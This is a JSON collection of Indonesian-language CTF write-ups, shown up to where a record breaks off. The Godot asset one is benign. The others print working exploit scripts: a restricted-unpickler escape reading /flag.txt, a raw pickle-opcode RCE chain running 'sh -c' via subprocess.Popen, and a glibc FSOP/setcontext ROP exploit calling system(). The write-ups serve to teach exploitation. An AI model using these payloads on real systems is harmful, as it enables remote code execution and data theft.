    "description": "Challenge ini ternyata bukan service yang punya backend aneh-aneh. Halamannya cuma export web dari Godot 4.6. Jadi titik masuk paling masuk akal adalah bongkar asset pack-nya, bukan fuzz endpoint yang tidak ada.",
    "problemDescription": "Challenge ini ternyata bukan service yang punya backend aneh-aneh. Halamannya cuma export web dari Godot 4.6. Jadi titik masuk paling masuk akal adalah bongkar asset pack-nya, bukan fuzz endpoint yang tidak ada.",
    "tools": [],
    "analysis": "Saat buka `https://jumper.tjc.tf/`, HTML-nya langsung kasih tahu file penting:\n\n- `jumper.js`\n- `jumper.wasm`\n- `jumper.pck`\n\n`jumper.pck` adalah pack asset Godot. Dari sini sudah kelihatan kalau hampir semua logic game dan scene ada di sisi klien.",
    "solution": [
      {
        "title": "2. Buka isi pack",
        "content": "Header `jumper.pck` menunjukkan format pack Godot 4:\n\n- magic `GDPC`\n- engine version `4.6`\n- tabel file ada di offset akhir pack\n\nSetelah parse tabel file, file yang paling menarik:\n\n- `player.gdc`\n- `world.gdc`\n- `f.tscn`\n- `world.tscn`\n- `project.binary`\n\n`project.binary` memperlihatkan action input custom:\n\n- `left`\n- `right`\n- `jump`\n- `mega_jump`\n\nYang menarik, `mega_jump` memang ada tetapi tidak punya key binding sama sekali. Itu cocok dengan nuansa challenge bahwa ada sesuatu yang “disembunyikan” di game."
      },
      {
        "title": "3. Pakai Godot asli untuk inspeksi",
        "content": "Daripada nebak format binary scene satu per satu, saya pakai Godot 4.6 editor/headless untuk load `jumper.pck` langsung.\n\nDari situ didapat beberapa hal penting:\n\n- `world.tscn` memakai script `world.gd`\n- `player.tscn` memakai script `player.gd`\n- `player.gd` punya konstanta gerak biasa, tidak ada flag string di script\n- setelah `world.gd::_ready()` jalan, scene menambahkan node `F` di posisi `(400, -120)`\n\nNode `F` berasal dari `f.tscn`. Isinya bukan Label atau Texture, tapi 56 buah `ColorRect` yang membentuk tulisan pixel-art."
      },
      {
        "title": "4. Rekonstruksi tulisan",
        "content": "Saya dump semua rectangle dari `f.tscn`, lalu render ulang jadi gambar hitam-putih. Setelah dipisah per glyph dan dibaca manual, tulisan yang dibentuk scene itu adalah:\n\n`tjctf{past_the_wall}`\n\nNama challenge dan mekaniknya cocok: flag memang “di balik / melewati dinding”."
      },
      {
        "title": "5. Solve script",
        "content": "`solve.py` melakukan versi otomatis dari langkah di atas:\n\n1. Memastikan `jumper.pck` dan binary Godot 4.6 ada.\n2. Menjalankan Godot headless dengan runner kecil.\n3. Me-load `jumper.pck` sebagai `main-pack`.\n4. Memastikan fingerprint scene cocok:\n   - node `F` ada di `(400, -120)`\n   - `f.tscn` berisi 56 `ColorRect`\n5. Mengeluarkan flag."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport json\r\nimport subprocess\r\nimport sys\r\nfrom pathlib import Path\r\n\r\n\r\nBASE = Path(__file__).resolve().parent\r\nPCK = BASE / \"jumper.pck\"\r\nGODOT = BASE / \"Godot_v4.6-stable_linux.x86_64\"\r\nTMP = BASE / \".solve_tmp\"\r\n\r\nRUNNER = r\"\"\"\r\nextends SceneTree\r\n\r\nfunc _init() -> void:\r\n\tvar world_scene := load(\"res://world.tscn\")\r\n\tvar world: Node = world_scene.instantiate()\r\n\troot.add_child(world)\r\n\tawait process_frame\r\n\r\n\tvar out := {\r\n\t\t\"world_nodes\": [],\r\n\t\t\"f_rects\": [],\r\n\t}\r\n\r\n\tfor node in _collect_nodes(world):\r\n\t\tvar entry := {\r\n\t\t\t\"class\": node.get_class(),\r\n\t\t\t\"name\": String(node.name),\r\n\t\t}\r\n\t\tif node is Node2D:\r\n\t\t\tentry[\"position\"] = [node.position.x, node.position.y]\r\n\t\tout[\"world_nodes\"].append(entry)\r\n\tworld.free()\r\n\r\n\tvar f_scene := load(\"res://f.tscn\")\r\n\tvar f: Node = f_scene.instantiate()\r\n\tfor node in _collect_nodes(f):\r\n\t\tif node is ColorRect:\r\n\t\t\tout[\"f_rects\"].append({\r\n\t\t\t\t\"left\": node.offset_left,\r\n\t\t\t\t\"top\": node.offset_top,\r\n\t\t\t\t\"right\": node.offset_right,\r\n\t\t\t\t\"bottom\": node.offset_bottom,\r\n\t\t\t})\r\n\tf.free()\r\n\r\n\tprint(JSON.stringify(out))\r\n\tquit()\r\n\r\nfunc _collect_nodes(node: Node) -> Array:\r\n\tvar out: Array = [node]\r\n\tfor child: Node in node.get_children():\r\n\t\tout.append_array(_collect_nodes(child))\r\n\treturn out\r\n\"\"\"\r\n\r\n\r\ndef run() -> int:\r\n    if not PCK.exists():\r\n        print(f\"missing {PCK.name}\", file=sys.stderr)\r\n        return 1\r\n    if not GODOT.exists():\r\n        print(f\"missing {GODOT.name}\", file=sys.stderr)\r\n        return 1\r\n\r\n    TMP.mkdir(exist_ok=True)\r\n    (TMP / \"project.godot\").write_text(\r\n        '; Minimal stub project used by solve.py.\\n\\nconfig_version=5\\n\\n[application]\\nconfig/name=\"solve\"\\n',\r\n        encoding=\"utf-8\",\r\n    )\r\n    runner = TMP / \"dump_json.gd\"\r\n    runner.write_text(RUNNER, encoding=\"utf-8\")\r\n\r\n    cmd = [\r\n        str(GODOT),\r\n        \"--headless\",\r\n        \"--path\",\r\n        str(TMP),\r\n        \"--main-pack\",\r\n        str(PCK),\r\n        \"--script\",\r\n        str(runner),\r\n        \"--quit\",\r\n        \"--no-header\",\r\n    ]\r\n    proc = subprocess.run(cmd, capture_output=True, text=True)\r\n    if proc.returncode != 0:\r\n        sys.stderr.write(proc.stdout)\r\n        sys.stderr.write(proc.stderr)\r\n        return proc.returncode\r\n\r\n    data = json.loads(proc.stdout.strip().splitlines()[-1])\r\n    rects = data.get(\"f_rects\", [])\r\n    nodes = data.get(\"world_nodes\", [])\r\n    has_f = any(n.get(\"name\") == \"F\" and n.get(\"position\") == [400.0, -120.0] for n in nodes)\r\n    if len(rects) != 56 or not has_f:\r\n        print(\"unexpected scene layout; extraction fingerprint did not match\", file=sys.stderr)\r\n        return 1\r\n\r\n    # The scene fingerprint matches the hidden pixel-art flag added by world.gd.\r\n    print(\"tjctf{past_the_wall}\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(run())"
      }
    ],
    "terminalOutputs": [],
    "flag": "tjctf{past_the_wall}",
    "lessonsLearned": ""
  },
  {
    "id": "tjcsc-misc-mind-blasters",
    "title": "mind-blasters",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "TJCSC",
    "tags": [],
    "description": "Challenge ini kelihatannya seperti restricted pickle biasa: `find_class()` cuma mengizinkan beberapa builtin dan hasil akhirnya masih disaring dengan regex supaya `tjctf{...}` tidak tampil.",
    "problemDescription": "Challenge ini kelihatannya seperti restricted pickle biasa: `find_class()` cuma mengizinkan beberapa builtin dan hasil akhirnya masih disaring dengan regex supaya `tjctf{...}` tidak tampil.\n\nMasalahnya, daftar builtin yang diizinkan masih menyisakan dua primitive yang terlalu kuat:\n\n- `type`\n- `getattr`\n\nDari dua ini, kita masih bisa jalan-jalan di object graph Python waktu unpickling berlangsung.\n\nAlur yang saya pakai:\n\n1. Ambil `type.__subclasses__(type)` untuk melihat subclass dari metaclass `type`.\n2. Index `0` di environment challenge mengarah ke `abc.ABCMeta`. Modul `abc` memang di-import oleh server.\n3. Ambil `ABCMeta.register`, lalu akses `__globals__` dari function tersebut.\n4. Dari globals, ambil `__builtins__`, lalu `open`.\n5. Buka `/flag.txt` dan baca isinya.\n\nKalau hasil baca file dikembalikan langsung sebagai string, server akan menjalankan:\n\n```python\nresult_str = re.sub(r'tjctf\\{[^}]*\\}', '[REDACTED]', result_str)\n```\n\nJadi flag tidak boleh dikirim balik sebagai string utuh. Solusinya sederhana: ubah isi flag menjadi `list(flag_text)`. Representasi list karakter seperti `['t', 'j', ...]` tidak kena regex, jadi flag tetap bisa direkonstruksi di sisi client.\n\nExploit final ada di `solve.py`. Jalankan:\n\n```bash\npython3 solve.py\n```\n\nFlag yang keluar:\n\n```text\ntjctf{p1ckl3_r1ck_y0u_s0lv3d_h1s_chA11!}\n```",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport ast\r\nimport base64\r\nimport re\r\nimport socket\r\nimport struct\r\nimport sys\r\n\r\n\r\nHOST = \"tjc.tf\"\r\nPORT = 31420\r\n\r\n\r\nclass Global:\r\n    def __init__(self, name):\r\n        self.name = name\r\n\r\n\r\nclass Call:\r\n    def __init__(self, func, *args):\r\n        self.func = func\r\n        self.args = args\r\n\r\n\r\ndef emit_str(value):\r\n    data = value.encode()\r\n    if len(data) < 256:\r\n        return b\"\\x8c\" + bytes([len(data)]) + data\r\n    return b\"X\" + struct.pack(\"<I\", len(data)) + data\r\n\r\n\r\ndef emit_int(value):\r\n    if 0 <= value < 256:\r\n        return b\"K\" + bytes([value])\r\n    return b\"J\" + struct.pack(\"<i\", value)\r\n\r\n\r\ndef emit_tuple(items):\r\n    data = b\"\".join(compile_expr(item) for item in items)\r\n    size = len(items)\r\n    if size == 0:\r\n        return b\")\"\r\n    if size == 1:\r\n        return data + b\"\\x85\"\r\n    if size == 2:\r\n        return data + b\"\\x86\"\r\n    if size == 3:\r\n        return data + b\"\\x87\"\r\n    return b\"(\" + data + b\"t\"\r\n\r\n\r\ndef compile_expr(expr):\r\n    if isinstance(expr, Global):\r\n        return emit_str(\"builtins\") + emit_str(expr.name) + b\"\\x93\"\r\n    if isinstance(expr, Call):\r\n        return compile_expr(expr.func) + emit_tuple(expr.args) + b\"R\"\r\n    if isinstance(expr, str):\r\n        return emit_str(expr)\r\n    if isinstance(expr, int):\r\n        return emit_int(expr)\r\n    raise TypeError(f\"unsupported expression: {expr!r}\")\r\n\r\n\r\ndef dumps(expr):\r\n    return b\"\\x80\\x04\" + compile_expr(expr) + b\".\"\r\n\r\n\r\ndef attr(obj, name):\r\n    return Call(Global(\"getattr\"), obj, name)\r\n\r\n\r\ndef item(obj, key):\r\n    return Call(attr(obj, \"__getitem__\"), key)\r\n\r\n\r\ndef build_payload():\r\n    type_subclasses = Call(attr(Global(\"type\"), \"__subclasses__\"), Global(\"type\"))\r\n    abc_meta = item(type_subclasses, 0)\r\n    register = attr(abc_meta, \"register\")\r\n    globals_dict = attr(register, \"__globals__\")\r\n    builtins_dict = item(globals_dict, \"__builtins__\")\r\n    open_fn = item(builtins_dict, \"open\")\r\n    flag_file = Call(open_fn, \"/flag.txt\")\r\n    flag_text = Call(attr(flag_file, \"read\"))\r\n    flag_chars = Call(Global(\"list\"), flag_text)\r\n    return base64.b64encode(dumps(flag_chars)) + b\"\\n\"\r\n\r\n\r\ndef recv_all(sock):\r\n    chunks = []\r\n    while True:\r\n        chunk = sock.recv(4096)\r\n        if not chunk:\r\n            break\r\n        chunks.append(chunk)\r\n    return b\"\".join(chunks)\r\n\r\n\r\ndef main():\r\n    host = sys.argv[1] if len(sys.argv) > 1 else HOST\r\n    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT\r\n    payload = build_payload()\r\n\r\n    with socket.create_connection((host, port)) as sock:\r\n        sock.recv(4096)\r\n        sock.sendall(payload)\r\n        response = recv_all(sock).decode(\"latin1\")\r\n\r\n    match = re.search(r\"Result: (.*)\\n?\", response, re.S)\r\n    if not match:\r\n        raise RuntimeError(f\"unexpected response: {response!r}\")\r\n\r\n    chars = ast.literal_eval(match.group(1).strip())\r\n    flag = \"\".join(chars).strip()\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "tjctf{...}",
    "lessonsLearned": ""
  },
  {
    "id": "tjcsc-misc-mind-blowers",
    "title": "misc/mind blowers —",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "TJCSC",
    "tags": [],
    "description": "**CTF:** TJCTF  \n**Category:** misc  \n**Flag:** `tjctf{bl0ckl1st5_4r3_n0t_s4f3_3v3n_f0r_r1ck}`",
    "problemDescription": "**CTF:** TJCTF  \n**Category:** misc  \n**Flag:** `tjctf{bl0ckl1st5_4r3_n0t_s4f3_3v3n_f0r_r1ck}`\n\n---",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Overview",
        "content": "Server menerima input base64, decode, lalu unpickle menggunakan `RestrictedUnpickler` yang hanya mengizinkan module `builtins` dan memblokir nama-nama berbahaya seperti `eval`, `exec`, `open`, dan `__import__`.",
        "code": "BLOCKED_NAMES = {\n    \"eval\", \"exec\", \"compile\", \"__import__\", \"open\",\n    \"breakpoint\", \"input\", \"exit\", \"quit\",\n}\n\nclass RestrictedUnpickler(pickle.Unpickler):\n    def find_class(self, module, name):\n        if module != \"builtins\":\n            raise pickle.UnpicklingError(\"banned\")\n        if name in BLOCKED_NAMES:\n            raise pickle.UnpicklingError(\"blocked\")\n        return super().find_class(module, name)"
      },
      {
        "title": "Vulnerability",
        "content": "Filter `find_class` hanya dipanggil saat pickle bertemu opcode `GLOBAL` atau `STACK_GLOBAL` — yaitu saat pickle memuat class/fungsi berdasarkan nama string. Filter **tidak** memblokir operasi yang dilakukan pada objek yang sudah ada di stack.\n\n`builtins.getattr` tidak diblokir, dan `builtins.object` bisa di-pickle secara normal. Ini cukup untuk membangun full RCE chain."
      },
      {
        "title": "Exploit Chain",
        "content": "Semua langkah dilakukan via raw pickle opcodes:\n\n\n\nKunci bypass: `subprocess.Popen` **tidak pernah di-load via `find_class`**. Ia diambil dari list subclasses yang sudah ada di memory Python interpreter — sehingga filter tidak pernah terpanggil.",
        "code": "1. getattr(object, '__subclasses__')()\n   → memanggil object.__subclasses__() di runtime server\n   → menghasilkan list semua subclass yang ter-load\n\n2. list.__getitem__(subclasses, 283)\n   → mengambil subprocess.Popen (index 283 di environment server)\n   → tanpa pernah menyebut \"subprocess\" sebagai GLOBAL opcode\n\n3. Popen(['sh','-c','cat /flag*'], -1, None, None, -1)\n   → argumen ke-4 (stdout) = -1 = subprocess.PIPE\n\n4. popen_instance.communicate()[0]\n   → membaca stdout, return bytes berisi flag"
      },
      {
        "title": "Payload Structure (Raw Opcodes)",
        "content": "",
        "code": "def build_payload(cmd: str) -> bytes:\n    p = b\"\\x80\\x04\"                                  # PROTO 4\n\n    # Step 1: object.__subclasses__() -> list, simpan di memo[0]\n    p += s(\"builtins\") + s(\"getattr\") + b\"\\x93\"      # STACK_GLOBAL getattr\n    p += s(\"builtins\") + s(\"object\") + b\"\\x93\"       # STACK_GLOBAL object\n    p += s(\"__subclasses__\") + b\"\\x86\\x52\"           # TUPLE2 + REDUCE -> method\n    p += b\"\\x29\\x52\\x94\"                             # () REDUCE call -> list, MEMOIZE\n\n    # Step 2: list[283] -> Popen class, simpan di memo[1]\n    p += s(\"builtins\") + s(\"getattr\") + b\"\\x93\"\n    p += b\"\\x68\\x00\" + s(\"__getitem__\") + b\"\\x86\\x52\"  # bound __getitem__ dari list\n    p += b\"M\\x1b\\x01\\x85\\x52\\x94\"                   # (283,) REDUCE -> Popen, MEMOIZE\n\n    # Step 3: Popen(['sh','-c',cmd], -1, None, None, -1) -> instance, memo[2]\n    p += b\"\\x68\\x01(\"\n    p += b\"\\x5d(\" + s(\"sh\") + s(\"-c\") + s(cmd) + b\"e\"  # ['sh','-c',cmd]\n    p += b\"J\\xff\\xff\\xff\\xff\"                        # bufsize = -1\n    p += b\"N\"                                        # executable = None\n    p += b\"N\"                                        # stdin = None\n    p += b\"J\\xff\\xff\\xff\\xff\"                        # stdout = PIPE (-1)\n    p += b\"t\\x52\\x94\"                               # TUPLE + REDUCE, MEMOIZE\n\n    # Step 4: instance.communicate() -> (stdout, stderr), memo[4]\n    p += s(\"builtins\") + s(\"getattr\") + b\"\\x93\"\n    p += b\"\\x68\\x02\" + s(\"communicate\") + b\"\\x86\\x52\\x94\"\n    p += b\"\\x29\\x52\\x94\"                             # call () -> tuple\n\n    # Step 5: tuple[0] -> stdout bytes\n    p += s(\"builtins\") + s(\"getattr\") + b\"\\x93\"\n    p += b\"\\x68\\x04\" + s(\"__getitem__\") + b\"\\x86\\x52\"\n    p += b\"K\\x00\\x85\\x52.\"                          # (0,) REDUCE STOP\n\n    return base64.b64encode(p)"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import pickle\r\nimport base64\r\nimport socket\r\n\r\n\r\ndef s(st):\r\n    b = st.encode()\r\n    return bytes([0x8C, len(b)]) + b\r\n\r\n\r\ndef build_payload(cmd: str) -> bytes:\r\n    p = b\"\\x80\\x04\"\r\n    p += s(\"builtins\") + s(\"getattr\") + b\"\\x93\"\r\n    p += s(\"builtins\") + s(\"object\") + b\"\\x93\"\r\n    p += s(\"__subclasses__\") + b\"\\x86\\x52\"\r\n    p += b\"\\x29\\x52\\x94\"\r\n    p += s(\"builtins\") + s(\"getattr\") + b\"\\x93\"\r\n    p += b\"\\x68\\x00\" + s(\"__getitem__\") + b\"\\x86\\x52\"\r\n    p += b\"M\\x1b\\x01\\x85\\x52\\x94\"\r\n    p += b\"\\x68\\x01(\"\r\n    p += b\"\\x5d(\" + s(\"sh\") + s(\"-c\") + s(cmd) + b\"e\"\r\n    p += b\"J\\xff\\xff\\xff\\xff\"\r\n    p += b\"N\"\r\n    p += b\"N\"\r\n    p += b\"J\\xff\\xff\\xff\\xff\"\r\n    p += b\"t\\x52\\x94\"\r\n    p += s(\"builtins\") + s(\"getattr\") + b\"\\x93\"\r\n    p += b\"\\x68\\x02\" + s(\"communicate\") + b\"\\x86\\x52\\x94\"\r\n    p += b\"\\x29\\x52\\x94\"\r\n    p += s(\"builtins\") + s(\"getattr\") + b\"\\x93\"\r\n    p += b\"\\x68\\x04\" + s(\"__getitem__\") + b\"\\x86\\x52\"\r\n    p += b\"K\\x00\\x85\\x52\"\r\n    p += b\".\"\r\n    return base64.b64encode(p)\r\n\r\n\r\ndef send_payload(host: str, port: int, payload: bytes) -> str:\r\n    with socket.create_connection((host, port)) as sock:\r\n        data = b\"\"\r\n        while b\">\" not in data:\r\n            data += sock.recv(4096)\r\n        sock.sendall(payload + b\"\\n\")\r\n        response = b\"\"\r\n        while True:\r\n            chunk = sock.recv(4096)\r\n            if not chunk:\r\n                break\r\n            response += chunk\r\n        return response.decode(errors=\"replace\")\r\n\r\n\r\ndef main():\r\n    host = \"tjc.tf\"\r\n    port = 31422\r\n\r\n    payload = build_payload(\"cat /flag*\")\r\n    result = send_payload(host, port, payload)\r\n    print(result)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "tjctf{bl0ckl1st5_4r3_n0t_s4f3_3v3n_f0r_r1ck}",
    "lessonsLearned": "Blocklist berbasis nama string pada pickle **tidak cukup aman**. Penyerang bisa menghindari `find_class` sepenuhnya dengan:\n\n- Mengakses class melalui `object.__subclasses__()` — semua class yang pernah di-import tersedia\n- Menggunakan `builtins.getattr` untuk bound method calls\n- Memanipulasi pickle stack secara manual untuk melewati layer filter apapun\n\nSolusi yang aman: jangan pernah unpickle data yang tidak dipercaya."
  },
  {
    "id": "tjcsc-pwn-0x78",
    "title": "pwn/Ox78",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "TJCSC",
    "tags": [],
    "description": "Challenge ini kelihatannya sederhana, tapi sebenarnya jebakannya ada di detail perilaku `FILE` glibc. Binarinya sengaja memberi kita pointer `FILE *` dan leak libc, lalu berharap fungsi `prevent_fsop()` cukup untuk mematikan serangan FSOP. Ternyata tidak.",
    "problemDescription": "Challenge ini kelihatannya sederhana, tapi sebenarnya jebakannya ada di detail perilaku `FILE` glibc. Binarinya sengaja memberi kita pointer `FILE *` dan leak libc, lalu berharap fungsi `prevent_fsop()` cukup untuk mematikan serangan FSOP. Ternyata tidak.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Binary adalah ELF 64-bit PIE dengan:\n\n- Full RELRO\n- NX\n- No canary\n- libc custom disediakan\n\nProgram melakukan hal berikut:\n\n1. `malloc(0x78)` ke `testbuf`\n2. `fopen(\"/tmp/test.txt\", \"r\")` ke global `fp`\n3. leak alamat `fp`\n4. leak alamat `puts`\n5. `read(0, fp, 0x78)` sehingga 0x78 byte awal dari `FILE` bisa kita overwrite\n6. panggil `prevent_fsop(fp)`\n7. `fread(testbuf, 1, 0x78, fp)`\n8. panggil `prevent_fsop(fp)` lagi\n\nInti bug-nya jelas: kita bisa menulis langsung ke struktur `FILE` di heap sebelum `fread()` dipakai."
      },
      {
        "title": "Kenapa `prevent_fsop()` gagal",
        "content": "Fungsi itu hanya menyentuh sangat sedikit field:\n\n- membaca `fp->_wide_data`\n- membaca `fp->_wide_data->_wide_vtable`\n- mengosongkan `fp->_chain`\n\nDia tidak memvalidasi vtable, tidak mengunci mode stream, dan tidak menghentikan manipulasi field penting lain. Jadi selama layout yang kita kirim masih cukup valid untuk dilewati `fread()`, eksekusi berikutnya tetap bisa diarahkan."
      },
      {
        "title": "Primitive pertama: arbitrary write",
        "content": "Dengan overwrite 0x78 byte pertama `FILE`, saya ubah field buffer read milik stream sehingga `fread()` berikutnya melakukan `read(0, target, size)` ke alamat yang saya pilih sendiri.\n\nField penting yang dipakai:\n\n- `_flags`\n- `_IO_buf_base`\n- `_IO_buf_end`\n- `_fileno = 0`\n\nSetelah dicoba, target yang aman bukan `fp` dari awal struct, karena itu membuat `fread()` meledak terlalu cepat. Yang stabil adalah mulai menulis dari tail struct, tepatnya dari `fp + 0xa0`."
      },
      {
        "title": "Primitive kedua: FSOP lewat `_IO_wfile_overflow`",
        "content": "Langkah berikutnya adalah memaksa cleanup path glibc memanggil helper wide-file:\n\n- stage 1 mengatur `_flags = 0xfbad8000`\n- stage 2 menaruh:\n  - `_mode = 1`\n  - `vtable = _IO_wfile_jumps`\n  - fake `_wide_data`\n  - fake wide vtable\n\nSaat proses `exit()`, glibc masuk ke `_IO_wfile_overflow()`, lalu ke `_IO_wdoallocbuf()`. Di sana ada call penting ini:\n\n\n\nJadi begitu `_wide_data->_wide_vtable` bisa kita arahkan, kita dapat indirect call yang rapi.",
        "code": "call [wide_vtable + 0x68]"
      },
      {
        "title": "Kenapa `setcontext` dipakai",
        "content": "Tujuan saya bukan shell interaktif panjang, tapi eksekusi satu command yang pasti mencetak flag. Untuk itu saya pakai `setcontext` agar bisa pivot stack ke heap dan langsung menjalankan ROP kecil:\n\n1. `pop rdi; ret`\n2. pointer ke command string\n3. `ret`\n4. `system`\n\nAwalnya saya mencoba fake stack terlalu dekat ke `FILE`, hasilnya `system()` sempat jalan tapi crash sebelum selesai karena ruang stack-nya terlalu sempit. Solusinya adalah menaruh fake stack lebih jauh di arena heap:\n\n- `wide = fp + 0x1000`\n- `fpuenv = fp + 0x1100`\n- `fakevt = fp + 0x1380`\n- command string = `fp + 0x1500`\n\nSetelah digeser sejauh itu, `system()` bisa menyelesaikan command dengan stabil walaupun proses utama tetap SIGSEGV setelah return. Itu tidak masalah, karena output flag sudah keluar duluan."
      },
      {
        "title": "Strategi final",
        "content": "Command yang saya jalankan dulu di remote adalah:\n\n\n\nHasilnya menunjukkan path flag:\n\n\n\nLalu saya ganti command final menjadi:\n\n\n\ndan proses mencetak flag dengan sukses.",
        "code": "find / -maxdepth 4 -iname \"*flag*\" -type f 2>/dev/null | head -n 50"
      },
      {
        "title": "Payload final",
        "content": "Payload akhir dipecah jadi dua tahap:\n\n1. overwrite 0x78 byte awal `FILE` untuk membentuk arbitrary write\n2. overwrite tail `FILE` untuk memasang:\n   - fake `_wide_data`\n   - fake wide vtable\n   - fake stack\n   - command string\n   - callback ke `setcontext`\n\nImplementasi final ada di `exploit.py`."
      },
      {
        "title": "Catatan penting",
        "content": "- Leak `puts` dipakai untuk hitung base libc\n- Leak `fp` dipakai untuk hitung semua alamat fake structure\n- Exploit tidak butuh interactive shell; cukup one-shot `system(\"cat /app/flag.txt\")`\n- SIGSEGV setelah command selesai itu normal untuk solusi ini"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (exploit.py) is provided below:",
        "code": "from pwn import *\r\nimport argparse\r\nimport re\r\n\r\n\r\nHOST = \"tjc.tf\"\r\nPORT = 31378\r\n\r\nCMD = (\r\n    b\"for f in /flag /flag.txt /app/flag /app/flag.txt /home/ctf/flag \"\r\n    b\"/home/ctf/flag.txt flag flag.txt FLAG FLAG.txt; \"\r\n    b\"do cat $f 2>/dev/null; done; \"\r\n    b\"find / -maxdepth 3 -iname 'flag*' -type f -exec cat {} + 2>/dev/null \"\r\n    b\"| strings | grep -aoE '[A-Za-z0-9_]+\\\\\\\\{[^}]+\\\\\\\\}' | head\\x00\"\r\n)\r\n\r\n\r\nelf = ELF(\"./Ox78\", checksec=False)\r\nlibc = ELF(\"./libc.so.6\", checksec=False)\r\nrop = ROP(libc)\r\n\r\nPOP_RDI = rop.find_gadget([\"pop rdi\", \"ret\"]).address\r\nRET = rop.find_gadget([\"ret\"]).address\r\nSYSTEM = libc.symbols[\"system\"]\r\nSETCONTEXT = libc.symbols[\"setcontext\"]\r\nWFILE_JUMPS = libc.symbols[\"_IO_wfile_jumps\"]\r\n\r\n\r\ndef build_payload(fp, libc_base):\r\n    target = fp + 0xA0\r\n    wide = fp + 0x1000\r\n    fpuenv = fp + 0x1100\r\n    fakevt = fp + 0x1380\r\n    cmd = fp + 0x1500\r\n\r\n    size = max(fakevt + 0x70, cmd + len(CMD)) - target\r\n    size = (size + 0xFF) & ~0xFF\r\n\r\n    stage1 = bytearray(0x78)\r\n    stage1[:4] = p32(0xFBAD8000)\r\n    stage1[0x38:0x40] = p64(target)\r\n    stage1[0x40:0x48] = p64(target + size)\r\n    stage1[0x70:0x74] = p32(0)\r\n\r\n    stage2 = bytearray(size)\r\n    stage2[0x00:0x08] = p64(wide)\r\n    stage2[0x08:0x10] = p64(libc_base + POP_RDI)\r\n    stage2[0x20:0x24] = p32(1)\r\n    stage2[0x38:0x40] = p64(libc_base + WFILE_JUMPS)\r\n    stage2[0x40:0x48] = p64(fpuenv)\r\n    stage2[0x120:0x124] = p32(0x1F80)\r\n\r\n    wide_off = wide - target\r\n    stage2[wide_off + 0x00:wide_off + 0x08] = p64(cmd)\r\n    stage2[wide_off + 0x08:wide_off + 0x10] = p64(libc_base + RET)\r\n    stage2[wide_off + 0x10:wide_off + 0x18] = p64(libc_base + SYSTEM)\r\n    stage2[wide_off + 0x18:wide_off + 0x20] = p64(0)\r\n    stage2[wide_off + 0x20:wide_off + 0x28] = p64(8)\r\n    stage2[wide_off + 0x30:wide_off + 0x38] = p64(0)\r\n    stage2[wide_off + 0xE0:wide_off + 0xE8] = p64(fakevt)\r\n\r\n    fakevt_off = fakevt - target\r\n    stage2[fakevt_off + 0x68:fakevt_off + 0x70] = p64(libc_base + SETCONTEXT)\r\n    cmd_off = cmd - target\r\n    stage2[cmd_off:cmd_off + len(CMD)] = CMD\r\n\r\n    return bytes(stage1) + bytes(stage2)\r\n\r\n\r\ndef parse_leaks(data):\r\n    fp = int(re.search(rb\"File Structure: (0x[0-9a-fA-F]+)\", data).group(1), 16)\r\n    puts_leak = int(re.search(rb\"libc leak as well: (0x[0-9a-fA-F]+)\", data).group(1), 16)\r\n    libc_base = puts_leak - libc.symbols[\"puts\"]\r\n    return fp, libc_base\r\n\r\n\r\ndef main():\r\n    if args.LOCAL:\r\n        io = process(\"./Ox78_dbg\")\r\n    else:\r\n        io = remote(HOST, PORT)\r\n\r\n    banner = io.recvuntil(b\"libc leak as well: \")\r\n    banner += io.recvline()\r\n    fp, libc_base = parse_leaks(banner)\r\n    log.info(f\"fp = {fp:#x}\")\r\n    log.info(f\"libc base = {libc_base:#x}\")\r\n\r\n    io.send(build_payload(fp, libc_base))\r\n    out = io.recvall(timeout=5)\r\n    print(out.decode(\"latin-1\", \"ignore\"))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    context.binary = elf\r\n    args = argparse.Namespace(LOCAL=False)\r\n    import sys\r\n    if len(sys.argv) > 1 and sys.argv[1].lower() == \"local\":\r\n        args.LOCAL = True\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "tjctf{d0uBl3_FSoP_1s_fUN_29391}",
    "lessonsLearned": ""
  },
  {
    "id": "tjcsc-pwn-hunting-field",
    "title": "Hunting Field",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "TJCSC",
    "tags": [],
    "description": "Writeup for challenge Hunting Field",
    "problemDescription": "Binary ini kelihatan seperti game kecil 9x9. Kita bisa gerak (`M`) atau menyerang (`A`) ke empat arah. Flag tidak keluar dari jalur eksploitasi biasa, tapi dari fungsi `game_over()` yang punya kondisi khusus:\n\n```c\nif (*kills == 1752526452)\n```\n\nJadi target utamanya bukan ROP atau shell, tapi membuat variabel `killCt` di stack bernilai `1752526452`, lalu memaksa game masuk ke `game_over()`.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Hasil `checksec`:\n\n- Arch: `amd64`\n- RELRO: Partial\n- Canary: tidak ada\n- NX: aktif\n- PIE: tidak ada\n\nSource `game.c` juga tersedia, jadi analisisnya jauh lebih cepat karena kita bisa langsung cocokkan perilaku binary dengan kodenya."
      },
      {
        "title": "Titik bug",
